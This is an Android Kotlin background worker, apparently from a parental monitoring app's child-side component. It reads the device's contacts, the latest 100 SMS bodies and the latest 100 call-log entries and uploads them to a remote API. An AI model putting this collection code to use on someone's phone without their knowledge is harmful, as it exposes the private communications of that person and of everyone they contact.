package com.abo7tb.childapp.worker

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.app.ActivityCompat
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.abo7tb.childapp.data.local.SecurePrefsManager
import com.abo7tb.childapp.data.remote.ChildApiService
import com.abo7tb.childapp.data.remote.models.CallLogEntry
import com.abo7tb.childapp.data.remote.models.CallsRequest
import com.abo7tb.childapp.data.remote.models.Contact
import com.abo7tb.childapp.data.remote.models.ContactsRequest
import com.abo7tb.childapp.data.remote.models.SmsMessage
import com.abo7tb.childapp.data.remote.models.SmsRequest
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import timber.log.Timber
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

@HiltWorker
class DataSyncWorker @AssistedInject constructor(
    @Assisted appContext: Context,
    @Assisted workerParams: WorkerParameters,
    private val apiService: ChildApiService,
    private val securePrefsManager: SecurePrefsManager
) : CoroutineWorker(appContext, workerParams) {

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    override suspend fun doWork(): Result {
        return try {
            val uuid = securePrefsManager.getUuid() ?: return Result.failure()

            val hasContactsPerm = ActivityCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_CONTACTS
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasSmsPerm = ActivityCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_SMS
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasCallLogPerm = ActivityCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_CALL_LOG
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED

            if (hasContactsPerm) {
                val contacts = readContacts()
                if (contacts.isNotEmpty()) {
                    val response = apiService.syncContacts(uuid, ContactsRequest(contacts))
                    Timber.d("DataSyncWorker: contacts sync HTTP ${response.code()}, count=${contacts.size}")
                }
            }

            if (hasSmsPerm) {
                val smsList = readSms()
                if (smsList.isNotEmpty()) {
                    val response = apiService.syncSms(uuid, SmsRequest(smsList))
                    Timber.d("DataSyncWorker: SMS sync HTTP ${response.code()}, count=${smsList.size}")
                }
            }

            if (hasCallLogPerm) {
                val callLogs = readCallLogs()
                if (callLogs.isNotEmpty()) {
                    val response = apiService.syncCalls(uuid, CallsRequest(callLogs))
                    Timber.d("DataSyncWorker: calls sync HTTP ${response.code()}, count=${callLogs.size}")
                }
            }

            Result.success()
        } catch (e: Exception) {
            Timber.e(e, "DataSyncWorker: sync failed")
            Result.retry()
        }
    }

    private fun readContacts(): List<Contact> {
        val contacts = mutableListOf<Contact>()
        val cursor = applicationContext.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(0) ?: ""
                val number = it.getString(1) ?: ""
                if (number.isNotBlank()) {
                    contacts.add(Contact(name = name, phoneNumber = number))
                }
            }
        }
        return contacts
    }

    private fun readSms(): List<SmsMessage> {
        val smsList = mutableListOf<SmsMessage>()
        val cursor = applicationContext.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            null, null, "${Telephony.Sms.DATE} DESC LIMIT 100"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val type = it.getInt(3)
                val direction = when (type) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "incoming"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "outgoing"
                    else -> "incoming"
                }
                smsList.add(
                    SmsMessage(
                        phoneNumber = it.getString(0) ?: "",
                        messageBody = it.getString(1) ?: "",
                        direction = direction,
                        sentAt = isoFormat.format(Date(it.getLong(2)))
                    )
                )
            }
        }
        return smsList
    }

    private fun readCallLogs(): List<CallLogEntry> {
        val callLogs = mutableListOf<CallLogEntry>()
        val cursor = applicationContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
            ),
            null, null, "${CallLog.Calls.DATE} DESC LIMIT 100"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val type = it.getInt(3)
                val callType = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    else -> "missed"
                }
                callLogs.add(
                    CallLogEntry(
                        phoneNumber = it.getString(0) ?: "",
                        callType = callType,
                        durationSec = it.getInt(2),
                        calledAt = isoFormat.format(Date(it.getLong(1)))
                    )
                )
            }
        }
        return callLogs
    }
}
